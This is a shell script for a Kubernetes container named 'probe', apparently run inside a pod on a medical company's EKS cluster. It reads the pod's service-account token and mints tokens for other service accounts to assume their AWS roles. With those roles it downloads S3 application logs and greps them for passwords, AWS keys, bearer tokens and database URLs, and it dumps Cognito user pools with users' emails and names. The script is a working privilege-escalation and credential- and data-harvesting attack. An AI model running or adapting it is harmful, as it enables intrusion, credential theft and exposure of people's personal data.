containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I3027_START env=stage01 utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq curl gzip >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
assume(){
  NS=$1; SAN=$2
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN")
  R=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$R" ] && { echo "NO_ROLE $NS/$SAN"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$SAN"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$R" --role-session-name i3027 --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>/tmp/ae)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$SAN $(head -c 160 /tmp/ae | tr '\n' ' ')"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK $NS/$SAN role=$(echo "$R" | sed 's#.*role/##')"
  return 0
}
clear_aws(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }

# --- A) dev01.shifamedcloud.ai vhost judge (1 curl per host) ---
for H in labels.dev01.shifamedcloud.ai admin.dev01.shifamedcloud.ai dms.dev01.shifamedcloud.ai; do
  echo "===DNS $H==="
  getent hosts "$H" 2>/dev/null || echo "DNS_NXDOMAIN"
  echo "===CURL $H==="
  curl -k -m 5 -sS -o /dev/null -w "code=%{http_code} ip=%{remote_ip} time=%{time_total}\n" "https://$H/" 2>&1 | head -c 500
  echo
done

# --- B) S3 shifamed-* log prefixes ---
LOGB="lazamedical-stage01-usw2-log-bucket"
if assume audit-log audit-log-sa; then
  echo "===S3_BEGIN $LOGB==="
  : > /tmp/all.txt
  for P in audit-log authorization cognito data-management de-identifier metadata-extraction s3-ingestion user-management; do
    PRE="logs/shifamed-$P-app/"
    if aws s3api list-objects-v2 --bucket "$LOGB" --prefix "$PRE" --max-keys 50 --region us-west-2 --output json >/tmp/l 2>/tmp/e; then
      echo "PREFIX_OK $PRE n=$(jq '.KeyCount // 0' /tmp/l) trunc=$(jq '.IsTruncated // false' /tmp/l)"
      jq -r '.Contents[]? | "OBJ \(.Key)|\(.Size)|\(.LastModified)"' /tmp/l | head -50 | tee -a /tmp/all.txt
    else
      echo "PREFIX_NO $PRE $(head -c 200 /tmp/e | tr '\n' ' ')"
    fi
  done
  echo "===DL_BEGIN==="
  sort -t'|' -k2 -n /tmp/all.txt | awk -F'|' '{k=$1; sub(/^OBJ /,"",k); sz=$2+0; if (sz<=2097152 && k ~ /\.log(\.gz)?$/) print k"|"sz}' | head -5 > /tmp/pick.txt
  echo "PICK_COUNT=$(wc -l < /tmp/pick.txt)"; cat /tmp/pick.txt
  while IFS='|' read -r K SZ; do
    [ -z "$K" ] && continue
    echo "DL $K ($SZ)"
    if aws s3api get-object --bucket "$LOGB" --key "$K" /tmp/f --region us-west-2 >/tmp/go 2>/tmp/e; then
      if gzip -t /tmp/f 2>/dev/null; then gunzip -c /tmp/f > /tmp/txt 2>/dev/null; else cp /tmp/f /tmp/txt; fi
      echo "SIZE $(wc -c < /tmp/txt) HEAD $(head -c 200 /tmp/txt | tr '\n' ' ')"
      echo "GREP_BEGIN"
      grep -aoiE 'password|passwd|secret|token|AKIA[0-9A-Z]{16}|Bearer [A-Za-z0-9._-]+|smtp|api[_-]?key|sk-[A-Za-z0-9]{10,}|authorization|redis://[^ ]*|postgres://[^ ]*|mysql://[^ ]*|onmicrosoft' /tmp/txt 2>/dev/null | sort | uniq -c | sort -rn | head -40
      echo "GREP_END"
    else
      echo "DL_FAIL $(head -c 160 /tmp/e | tr '\n' ' ')"
    fi
  done < /tmp/pick.txt
  clear_aws
fi

# --- C) Cognito read-only user sample (best effort) ---
if assume cognito-service cognito-service-sa; then
  if aws cognito-idp list-user-pools --max-results 20 --region us-west-2 --output json >/tmp/pools 2>/tmp/e; then
    echo "POOLS_OK $(jq -c '[.UserPools[]|{Id:.Id,Name:.Name}]' /tmp/pools)"
    for PID in $(jq -r '.UserPools[].Id' /tmp/pools); do
      echo "USERS_BEGIN $PID"
      if aws cognito-idp list-users --user-pool-id "$PID" --limit 50 --region us-west-2 --output json >/tmp/u 2>/tmp/e; then
        jq -r '.Users[]? | "USER \(.Username)|\([.Attributes[]?|select(.Name=="email" or .Name=="given_name" or .Name=="family_name" or .Name=="cognito:user_status")|(.Name+"="+.Value)]|join(","))"' /tmp/u | head -50
        echo "SHIFA_HITS $(jq -r '.Users[]?.Username' /tmp/u | grep -icE 'shifa|sdhc')"
      else
        echo "USERS_NO $(head -c 160 /tmp/e | tr '\n' ' ')"
      fi
      echo "USERS_END $PID"
    done
  else
    echo "POOLS_NO $(head -c 200 /tmp/e | tr '\n' ' ')"
  fi
  clear_aws
fi

echo "===I3027_DONE $(date -u +%FT%TZ)==="
